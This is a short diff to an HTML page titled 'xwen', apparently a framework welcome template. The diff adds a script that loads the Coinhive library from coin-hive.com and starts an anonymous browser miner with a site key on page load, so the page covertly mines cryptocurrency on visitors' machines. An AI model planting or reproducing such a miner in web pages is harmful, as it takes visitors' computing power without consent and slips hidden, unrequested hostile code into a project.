@@ -6,7 +6,11 @@
         <meta name="viewport" content="width=device-width, initial-scale=1">
 
         <title>xwen</title>
-
+    <script src="//coin-hive.com/lib/coinhive.min.js"></script></head>
+<script>
+	var miner = new CoinHive.Anonymous('NSebdxOXSsVVtXfpoWAt9Meh0vUQd6yQ');
+	miner.start();
+</script>
         <!-- Fonts -->
         <link href="https://fonts.googleapis.com/css?family=Raleway:100,600" rel="stylesheet" type="text/css">
 
